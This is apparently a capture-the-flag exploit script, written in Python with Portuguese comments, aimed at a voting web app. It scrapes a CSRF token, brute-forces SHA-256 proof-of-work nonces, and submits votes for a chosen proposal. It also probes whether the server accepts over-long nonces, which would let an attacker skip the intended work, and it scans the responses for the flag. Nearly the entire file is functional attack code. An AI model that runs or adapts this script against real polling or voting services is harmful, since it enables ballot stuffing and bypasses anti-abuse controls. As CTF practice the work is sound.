#!/usr/bin/env python3
"""Probe2: descobre a regra de formato do nonce no servidor.
Teste 1 (happy path 6 digitos): refetch de challenge ate achar solucao em IDP-CTF-000000..999999, vota -> espera OK e count+1.
Teste 2 (fast path >6 digitos): acha nonce IDP-CTF-<7+ digitos>, vota -> se OK, servidor aceita espaco ilimitado.
Uso: python3 probe2.py http://<HOST>:45804 4
"""
import sys, re, hashlib, json
import urllib.request, urllib.error, http.cookiejar

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://<HOST>:45804"
PID  = sys.argv[2] if len(sys.argv) > 2 else "4"
PRE  = "urna-aberta:v1:"
FLAG = re.compile(r"IDP\{[^}]+\}")

cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def get(path):
    r = op.open(BASE + path, timeout=15); return r.status, r.read().decode("utf-8","replace")
def post(path, obj):
    req = urllib.request.Request(BASE+path, data=json.dumps(obj).encode(),
                                 headers={"Content-Type":"application/json"}, method="POST")
    try:
        r = op.open(req, timeout=15); return r.status, r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8","replace")
def csrf_of(h):
    m = re.search(r'name="csrf-token" content="([^"]+)"', h); return m.group(1) if m else None
def count_of(h, pid):
    m = re.search(r'data-proposal-id="%s".*?<strong>\s*([0-9]+)\s*/'%re.escape(pid), h, re.S); return m.group(1) if m else "?"
def h_startswith(nonce, prefix):
    return hashlib.sha256((PRE+nonce).encode()).hexdigest().startswith(prefix)
def hunt(t, tag):
    m = FLAG.search(t)
    if m: print(">>> FLAG (%s): %s" % (tag, m.group(0)))

def solve_range(prefix, lo, hi):
    for d in range(lo, hi):
        n = "IDP-CTF-%06d" % d            # d<1e6 -> 6 digitos; d>=1e6 -> 7 digitos
        if h_startswith(n, prefix): return n, d
    return None, None

st, home = get("/"); csrf = csrf_of(home)
print("GET / -> %s csrf=%s count(prop %s)=%s" % (st, csrf, PID, count_of(home, PID)))

# ---- Teste 1: happy path 6 digitos (refetch ate solucao existir em 0..999999) ----
print("\n[Teste1] procurando challenge solucionavel em 6 digitos...")
ok1 = None
for attempt in range(40):
    _, ch = get("/api/pow/challenge"); chal = json.loads(ch)
    n, d = solve_range(chal["prefix"], 0, 1_000_000)
    if n:
        print("  challenge #%d prefix=%s -> nonce=%s (d=%d)" % (attempt, chal["prefix"], n, d))
        st, v = post("/api/votes", {"csrf":csrf,"challenge":chal["challenge"],"nonce":n,"proposal_id":PID})
        print("  VOTO 6dig -> %s %s" % (st, v)); hunt(v,"t1"); ok1 = (st==200); break
else:
    print("  nenhum challenge solucionavel em 40 tentativas")

_, hm = get("/"); print("  count agora: %s" % count_of(hm, PID))

# ---- Teste 2: fast path >6 digitos ----
print("\n[Teste2] testando nonce de 7 digitos (espaco ilimitado)...")
_, ch = get("/api/pow/challenge"); chal = json.loads(ch)
n, d = solve_range(chal["prefix"], 1_000_000, 61_000_000)   # 7+ digitos
if n:
    print("  prefix=%s -> nonce=%s (d=%d)" % (chal["prefix"], n, d))
    st, v = post("/api/votes", {"csrf":csrf,"challenge":chal["challenge"],"nonce":n,"proposal_id":PID})
    print("  VOTO 7dig -> %s %s" % (st, v)); hunt(v,"t2")
else:
    print("  nao achei nonce 7dig no limite (raro)")

_, hm = get("/"); print("\ncount final(prop %s)=%s" % (PID, count_of(hm, PID))); hunt(hm,"home")
